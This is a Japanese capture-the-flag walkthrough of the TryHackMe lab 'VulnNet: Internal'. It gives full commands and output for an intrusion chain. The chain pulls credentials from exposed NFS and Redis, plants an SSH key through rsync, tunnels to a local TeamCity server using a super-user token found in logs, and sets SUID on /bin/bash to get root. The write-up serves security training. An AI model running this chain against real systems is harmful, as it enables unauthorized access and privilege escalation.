# VulnNet: Internal
- vulnNetシリーズ
- https://tryhackme.com/room/vulnnetinternal

## 攻撃シナリオ
1. ポートスキャン
1. SMBにアクセスし、フラグ取得
1. NFSにアクセスし、Redisの設定ファイルからパスワード取得
1. Redisにアクセスし、フラグ取得+ rsyncのパスワード取得
1. rsyncに接続し、SSHの公開鍵を不正に配置
1. SSHでログインし、フラグを取得
1. Victimからのみ閲覧できるCIサーバにアクセスするために、SSHのポートフォワーディング
1. CIサーバのSuperUserのトークンを探索
1. 攻撃端末からCIサーバにアクセスし、権限昇格用のコマンドを投げるようにビルドを設定
1. rootの状態でフラグ取得



## ポートスキャン

```
└─# nmap -sV -sC -T4 -p- thm_target
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-07 11:23 JST
Stats: 0:02:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 27.53% done; ETC: 11:31 (0:05:42 remaining)
Nmap scan report for thm_target (10.10.65.143)
Host is up (0.40s latency).
Not shown: 65522 closed ports
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
111/tcp   open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34093/tcp6  mountd
|   100005  1,2,3      50539/udp   mountd
|   100005  1,2,3      51735/udp6  mountd
|   100005  1,2,3      52031/tcp   mountd
|   100021  1,3,4      33999/tcp   nlockmgr
|   100021  1,3,4      41647/tcp6  nlockmgr
|   100021  1,3,4      48452/udp6  nlockmgr
|   100021  1,3,4      56113/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp   open     rsync       (protocol version 31)
2049/tcp  open     nfs_acl     3 (RPC #100227)
6379/tcp  open     redis       Redis key-value store
9090/tcp  filtered zeus-admin
33999/tcp open     nlockmgr    1-4 (RPC #100021)
41747/tcp open     mountd      1-3 (RPC #100005)
44465/tcp open     java-rmi    Java RMI
52031/tcp open     mountd      1-3 (RPC #100005)
59579/tcp open     mountd      1-3 (RPC #100005)
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -40m01s, deviation: 1h09m16s, median: -2s
|_nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2021-08-07T04:33:42+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-07T02:33:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 647.88 seconds

```

## SMBにアクセスし、フラグ取得
 - アクセス可能なディレクトリ確認
    - Lオプション：指定したサーバー上で利用可能な共有名などのサービス一覧を列挙する
    - Nオプション：クライアントはユーザーへの パスワード入力要求をしなくなる。
```
─# smbclient -L \\\\thm_target\\ -N      

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      VulnNet Business Shares
        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP 
```

- sharesにアクセスし、services.txtを取得
```
└─# smbclient \\\\thm_target\\shares\\ -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb  2 18:20:09 2021
  ..                                  D        0  Tue Feb  2 18:28:11 2021
  temp                                D        0  Sat Feb  6 20:45:10 2021
  data                                D        0  Tue Feb  2 18:27:33 2021

                11309648 blocks of size 1024. 3276104 blocks available
smb: \> cd temp
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 20:45:10 2021
  ..                                  D        0  Tue Feb  2 18:20:09 2021
  services.txt                        N       38  Sat Feb  6 20:45:09 2021

                11309648 blocks of size 1024. 3276104 blocks available
smb: \temp\> more services.txt
getting file \temp\services.txt of size 38 as /tmp/smbmore.IMMypX (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

```

# NFSにアクセスし、Redisの設定ファイルからパスワード取得
- NFSが動作しているので、マウント可能なディレクトリがないか確認

```
└─# showmount -e thm_target                                     
Export list for thm_target:
/opt/conf *

```

- /opt/confをローカルでマウントして、redisのパスワードを取得

```
┌──(root💀kali)-[~/vulnNet]
└─# mkdir NFS
                                                                    
┌──(root💀kali)-[~/vulnNet]
└─# ls
NFS
                                                                    
┌──(root💀kali)-[~/vulnNet]
└─# mount thm_target:/opt/conf NFS
                                                                    
┌──(root💀kali)-[~/vulnNet]
└─# ls NFS
hp  init  opt  profile.d  redis  vim  wildmidi
                                                                    
┌──(root💀kali)-[~/vulnNet]
└─# ls NFS/redis                  
redis.conf
                                                                    
┌──(root💀kali)-[~/vulnNet]
└─# grep pass  NFS/redis/redis.conf
# 2) No password is configured.
# If the master is password protected (using the "requirepass" configuration
# masterauth <master-password>
requirepass "B65Hx562F@ggAZ@F"
# resync is enough, just passing the portion of data the slave missed while
# 150k passwords per second against a good box. This means that you should
# use a very strong password otherwise it will be very easy to break.
# requirepass foobared

```


# Redisにアクセスし、フラグ取得+ rsyncのパスワード取得
- internal flag取得
- rsyncへのパスワード取得

```
┌──(root💀kali)-[~]
└─# redis-cli -h thm_target -a B65Hx562F@ggAZ@F 
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
thm_target:6379> keys *
1) "tmp"
2) "marketlist"
3) "authlist"
4) "int"
5) "internal flag"
thm_target:6379> get "authlist"
(error) WRONGTYPE Operation against a key holding the wrong kind of value
thm_target:6379> type "authlist"
list
thm_target:6379> lrange "authlist" 0 0
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
thm_target:6379> exit
                                                                    
┌──(root💀kali)-[~]
└─# echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

# rsyncに接続し、SSHの公開鍵を不正に配置

- 事前準備
    - sshkey作成 
```
┌──(root💀kali)-[~/vulnNet]
└─# ls -al  
total 16
drwxr-xr-x  4 root root 4096 Aug  7 12:00 .
drwx------ 30 root root 4096 Aug  7 12:05 ..
drwxr-xr-x  9 root root 4096 Feb  2  2021 NFS
drwxr-xr-x  2 root root 4096 Aug  7 12:00 .ssh
                                                                                                                       
┌──(root💀kali)-[~/vulnNet]
└─# cd .ssh   umount vulnNet/NFS
a
                                                                                               
┌──(root💀kali)-[~/vulnNet/.ssh]
└─# ssh-keygen -C ""                                            
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): ./id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./id_rsa
Your public key has been saved in ./id_rsa.pub
The key fingerprint is:
SHA256:q90993iQjPq8+gwF/EFjv4mVPs93e9RT3vhdgQUZ+5M 
The key's randomart image is:
+---[RSA 3072]----+
|            +o+  |
|         . o +.o |
|          o ..*  |
|           o *.+o|
|        S   +o=E=|
|         . .. ==B|
|        . ..   +O|
|       o ..=. ..O|
|      . . o+B+.+o|
+----[SHA256]-----+
                                                                                                                       
┌──(root💀kali)-[~/vulnNet/.ssh]
└─# ls    
id_rsa  id_rsa.pub
                                                                                                                       
┌──(root💀kali)-[~/vulnNet/.ssh]
└─# cat id_rsa.pub > authorized_keys

┌──(root💀kali)-[~/vulnNet/.ssh]
└─# chown 600 authorized_keys  
```

- rsyncでアクセス
```
┌──(root💀kali)-[~/vulnNet]
└─# rsync rsync://rsync-connect@thm_target/                        
files           Necessary home interaction
                                                                         
┌──(root💀kali)-[~/vulnNet]
└─# rsync rsync://rsync-connect@thm_target/files/                  
Password: 
drwxr-xr-x          4,096 2021/02/01 21:51:14 .
drwxr-xr-x          4,096 2021/08/07 12:43:07 sys-internal
                                                                         
┌──(root💀kali)-[~/vulnNet]
└─# rsync rsync://rsync-connect@thm_target/files/sys-internal/     
Password: 
drwxr-xr-x          4,096 2021/08/07 12:43:07 .
-rw-------             61 2021/02/06 21:49:28 .Xauthority
lrwxrwxrwx              9 2021/02/01 22:33:19 .bash_history
-rw-r--r--            220 2021/02/01 21:51:14 .bash_logout
-rw-r--r--          3,771 2021/02/01 21:51:14 .bashrc
-rw-r--r--             26 2021/02/01 21:53:18 .dmrc
-rw-r--r--            807 2021/02/01 21:51:14 .profile
lrwxrwxrwx              9 2021/02/02 23:12:29 .rediscli_history
-rw-r--r--              0 2021/02/01 21:54:03 .sudo_as_admin_successful
-rw-r--r--             14 2018/02/13 04:09:01 .xscreensaver
-rw-------          2,546 2021/02/06 21:49:35 .xsession-errors
-rw-------          2,546 2021/02/06 20:40:13 .xsession-errors.old
-rwx------              0 2021/08/07 12:43:07 test
-rw-------             38 2021/02/06 20:54:25 user.txt
drwxrwxr-x          4,096 2021/08/07 12:44:32 .cache
drwxrwxr-x          4,096 2021/02/01 21:53:57 .config
drwx------          4,096 2021/02/01 21:53:19 .dbus
drwx------          4,096 2021/02/01 21:53:18 .gnupg
drwxrwxr-x          4,096 2021/02/01 21:53:22 .local
drwx------          4,096 2021/02/01 22:37:15 .mozilla
drwxrwxr-x          4,096 2021/08/07 12:45:39 .ssh
drwx------          4,096 2021/02/02 20:16:16 .thumbnails
drwx------          4,096 2021/02/01 21:53:21 Desktop
drwxr-xr-x          4,096 2021/02/01 21:53:22 Documents
drwxr-xr-x          4,096 2021/02/01 22:46:46 Downloads
drwxr-xr-x          4,096 2021/02/01 21:53:22 Music
drwxr-xr-x          4,096 2021/02/01 21:53:22 Pictures
drwxr-xr-x          4,096 2021/02/01 21:53:22 Public
drwxr-xr-x          4,096 2021/02/01 21:53:22 Templates
drwxr-xr-x          4,096 2021/02/01 21:53:22 Videos
```
- sshの公開カギを投げつける
- エラーがでるけどコピーはできている
```
┌──(root💀kali)-[~/vulnNet]
└─# rsync -av .ssh/authorized_keys rsync://rsync-connect@thm_target/files/sys-internal/.ssh/
Password: 
sending incremental file list
authorized_keys
rsync: chgrp "/sys-internal/.ssh/.authorized_keys.NEDfl6" (in files) failed: Operation not permitted (1)

sent 111 bytes  received 150 bytes  40.15 bytes/sec
total size is 554  speedup is 2.12
rsync error: some files/attrs were not transferred (see previous errors) (code 23) at main.c(1330) [sender=3.2.3]
```
# SSHでログインし、フラグを取得
```
┌──(root💀kali)-[~/vulnNet]
└─# ssh -i .ssh/id_rsa sys-internal@thm_target                      23 ⨯
Enter passphrase for key '.ssh/id_rsa': 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Aug  7 05:46:16 2021 from 10.17.16.164
sys-internal@vulnnet-internal:~$ 

```

# Victimからのみ閲覧できるCIサーバにアクセスするために、SSHのポートフォワーディング
- ルート直下にTeamcityという見慣れないフォルダを確認
- readme/socketを見ると8111で動いていることがわかる

```
sys-internal@vulnnet-internal:~$ ls /
bin   home            lib64       opt   sbin      TeamCity  vmlinuz
boot  initrd.img      lost+found  proc  srv       tmp       vmlinuz.old
dev   initrd.img.old  media       root  swapfile  usr
etc   lib             mnt         run   sys       var
sys-internal@vulnnet-internal:~$ ls /TeamCity/
bin          conf        licenses            TeamCity-readme.txt  webapps
BUILD_85899  devPackage  logs                temp                 work
buildAgent   lib         service.properties  Tomcat-running.txt
sys-internal@vulnnet-internal:~$ cat /TeamCity/TeamCity-readme.txt 
This is the JetBrains TeamCity home directory.

To run the TeamCity server and agent using a console, execute:
* On Windows: `.\bin\runAll.bat start`
* On Linux and macOS: `./bin/runAll.sh start`

By default, TeamCity will run in your browser on `http://localhost:80/` (Windows) or `http://localhost:8111/` (Linux, macOS). If you cannot access the default URL, try these Troubleshooting tips: https://www.jetbrains.com/help/teamcity/installing-and-configuring-the-teamcity-server.html#Troubleshooting+TeamCity+Installation.

For evaluation purposes, we recommend running both server and agent. If you need to run only the TeamCity server, execute:
* On Windows: `.\bin\teamcity-server.bat start`
* On Linux and macOS: `./bin/teamcity-server.sh start`

For licensing information, see the "licenses" directory.

More information:
TeamCity documentation: https://www.jetbrains.com/help/teamcity/teamcity-documentation.html

```


- ロカールのソケット状態を確認
- ポートスキャンで検出されなかったポートをいくつか確認
```
nternal:~$ ss -tupln 
Netid State   Recv-Q  Send-Q         Local Address:Port      Peer Address:Port  
略
tcp   LISTEN  0       100       [::ffff:127.0.0.1]:8111                 *:*     
略
```
- teamcityはrootで動作している
```
sys-internal@vulnnet-internal:~$ ps -aux |grep teamcity
root       535  0.0  0.0   4628   772 ?        S    17:36   0:00 sh teamcity-server.sh _start_internal
root       544  0.0  0.0   4752  1752 ?        S    17:36   0:00 sh /TeamCity/bin/teamcity-server-restarter.sh run

```

- ポートフォワーディングでブラウザからアクセス
```
┌──(root💀kali)-[~/vulnNet]
└─# ssh -i .ssh/id_rsa sys-internal@thm_target -L 8111:127.0.0.1:8111
Enter passphrase for key '.ssh/id_rsa': 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Aug  7 05:51:06 2021 from 10.17.16.164
```

# CIサーバのSuperUserのトークンを探索
- super userのトークンをログから探す
```
sys-internal@vulnnet-internal:~$ ls /
bin   initrd.img      media  run       TeamCity  vmlinuz.old
boot  initrd.img.old  mnt    sbin      tmp
dev   lib             opt    srv       usr
etc   lib64           proc   swapfile  var
home  lost+found      root   sys       vmlinuz
sys-internal@vulnnet-internal:~$ cd /TeamCity/logs/
sys-internal@vulnnet-internal:/TeamCity/logs$ ls -al
total 464
drwxr-xr-x  2 root root   4096 Aug  7 05:32 .
drwxr-xr-x 12 root root   4096 Feb  6 13:30 ..
-rw-r-----  1 root root  12493 Feb  6 13:50 catalina.2021-02-06.log
-rw-r-----  1 root root   8132 Feb  7 19:24 catalina.2021-02-07.log
-rw-r-----  1 root root   6037 Aug  7 05:32 catalina.2021-08-07.log
-rw-r--r--  1 root root 164800 Aug  7 05:55 catalina.out
-rw-r-----  1 root root      0 Feb  6 13:30 host-manager.2021-02-06.log
-rw-r-----  1 root root      0 Feb  7 19:21 host-manager.2021-02-07.log
-rw-r-----  1 root root      0 Aug  7 05:30 host-manager.2021-08-07.log
-rw-r-----  1 root root      0 Feb  6 13:30 localhost.2021-02-06.log
-rw-r-----  1 root root      0 Feb  7 19:21 localhost.2021-02-07.log
-rw-r-----  1 root root      0 Aug  7 05:30 localhost.2021-08-07.log
-rw-r-----  1 root root      0 Feb  6 13:30 manager.2021-02-06.log
-rw-r-----  1 root root      0 Feb  7 19:21 manager.2021-02-07.log
-rw-r-----  1 root root      0 Aug  7 05:30 manager.2021-08-07.log
-rw-r-----  1 root root    967 Aug  7 05:36 teamcity-activities.log
-rw-r-----  1 root root    865 Feb  6 13:44 teamcity-auth.log
-rw-r-----  1 root root   1272 Aug  7 05:36 teamcity-cleanup.log
-rw-r-----  1 root root    374 Feb  6 13:45 teamcity-diagnostics.log
-rw-r-----  1 root root   6978 Feb  6 13:56 teamcity-javaLogging-2021-02-06.log
-rw-r-----  1 root root   3431 Feb  7 19:24 teamcity-javaLogging-2021-02-07.log
-rw-r-----  1 root root   3376 Aug  7 05:36 teamcity-javaLogging-2021-08-07.log
-rw-r--r--  1 root root      0 Aug  7 05:30 teamcity.lock
-rw-r-----  1 root root   3600 Aug  7 05:34 teamcity-mavenServer.log
-rw-r-----  1 root root    156 Feb  7 19:22 teamcity-nodes.log
-rw-r-----  1 root root   1288 Aug  7 05:35 teamcity-notifications.log
-rw-r--r--  1 root root      4 Aug  7 05:31 teamcity.pid
-rw-r-----  1 root root  19540 Aug  7 05:36 teamcity-rest.log
-rw-r-----  1 root root 175342 Aug  7 05:55 teamcity-server.log
-rw-r-----  1 root root    784 Feb  7 19:24 teamcity-tfs.log
-rw-r-----  1 root root   2012 Aug  7 05:37 teamcity-vcs.log
-rw-r--r--  1 root root    466 Aug  7 05:30 teamcity-wrapper.log
-rw-r-----  1 root root    568 Aug  7 05:32 teamcity-ws.log
sys-internal@vulnnet-internal:/TeamCity/logs$ grep "Super" catalina.out 
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 3976918189503636232 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 3976918189503636232 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 3976918189503636232 (use empty username with the token as the password to access the server)
sys-internal@vulnnet-internal:/TeamCity/logs$ 
sys-internal@vulnnet-internal:/TeamCity/logs$ 
sys-internal@vulnnet-internal:/TeamCity/logs$ 
sys-internal@vulnnet-internal:/TeamCity/logs$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
sys-internal@vulnnet-internal:/TeamCity/logs$ ls /root
ls: cannot open directory '/root': Permission denied
```

# 攻撃端末からCIサーバにアクセスし、権限昇格用のコマンドを投げるようにビルドを設定
- ブラウザ上で操作を行い以下コマンドをビルドに設定

```
chmod u+s /bin/bash
```
# rootの状態でフラグ取得
-ビルドを待つと、SUIDがbashに付与されるので、権限が昇格
```
sys-internal@vulnnet-internal:/TeamCity/logs$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
sys-internal@vulnnet-internal:/TeamCity/logs$ ls /root
ls: cannot open directory '/root': Permission denied
sys-internal@vulnnet-internal:/TeamCity/logs$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
sys-internal@vulnnet-internal:/TeamCity/logs$ /bin/bash -p
bash-4.4# whoami
root
bash-4.4# cd /root
bash-4.4# ls -al
total 44
drwx------  8 root root 4096 Feb  6 13:32 .
drwxr-xr-x 24 root root 4096 Feb  6 12:58 ..
lrwxrwxrwx  1 root root    9 Feb  1  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-x---  6 root root 4096 Aug  7 05:32 .BuildServer
drwx------  2 root root 4096 Feb  6 13:04 .cache
drwx------  4 root root 4096 Feb  6 12:59 .config
drwx------  3 root root 4096 Feb  6 12:59 .dbus
drwxr-xr-x  3 root root 4096 Feb  2  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
lrwxrwxrwx  1 root root    9 Feb  2  2021 .rediscli_history -> /dev/null
-rw-------  1 root root   38 Feb  6 12:56 root.txt
drwx------  4 root root 4096 Feb  6 12:59 .thumbnails
bash-4.4# cat root.txt

```
